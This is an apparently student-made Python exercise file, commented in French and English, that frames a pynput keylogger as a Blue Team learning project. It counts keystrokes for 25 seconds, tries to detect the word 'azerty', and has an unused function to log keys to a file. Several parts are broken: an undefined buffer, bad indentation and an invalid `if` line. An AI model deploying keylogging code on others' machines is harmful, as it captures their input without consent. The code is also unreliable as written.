"""
Projet pédagogique : Analyse d’un keylogger en Python
Version désactivée et sécurisée pour apprentissage Blue Team.

Le code ci-dessous est volontairement incomplet.
À vous de le compléter pour le faire fonctionner !
"""

from pynput import keyboard
from time import sleep
import os 

# Automatically clear the terminal
os.system("cls")

# Duration (in seconds) for key logging
LOGGING_TIME = 25

#Number of keystrokes
counter = 0

#Buffer pour détecter le mot "azerty"

# Function executed when a key is pressed.
def key_pressed(key):
    try:
        #Touche normale (lettres, chiffres...)
        data = key.char
    except AttributeError:
        # Indicate special keys
        data = key
    finally:
        #Envoyer la donnée à la fonction d'affichage
        print_data(data)


# Fonction d'affichage + compteur + détection de mot
def print_data(data):
    global counter 
    counter += 1

#Ajouter la touche au buffer pour détecter azerty
buffer.append(str(data))
if len(buffer) > 6:
    buffer.pop(0)

# Détection du mot "azerty"
if "", join(buffer) == "azerty"
     print("Mot détecté : azerty")


# Log data inside a file
def log_data(data):
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(str(data)+ "\n")


# Start the keylogger
def start_keylogger():
    print("Starting keylogger...")
    
    try:
        # Start logging keys for the specified amount of time
        with keyboard.Listener(on_press=key_pressed) as listener:
            sleep(LOGGING_TIME)

    except Exception as e:
        # Show the current Exception generated
        print("Erreur: impossible de démarrer le keylogger.")
    
    finally:
        # Add a message to tell the program is done
        print("The program is done.")


#Ajoutez un compteur de frappes qui compte le nombre de frappes clavier effectuées depuis le démarrage du programme.
"""
Pour ajouter un compteur de frappes, j’ai créé une variable globale counter initialisée à 0.
À chaque fois que la fonction print_data(data) est appelée, j’incrémente cette variable avec counter += 1.
Ainsi, le programme compte le nombre total de frappes clavier depuis son démarrage."""

# Lancer le programme
start_keylogger()


 

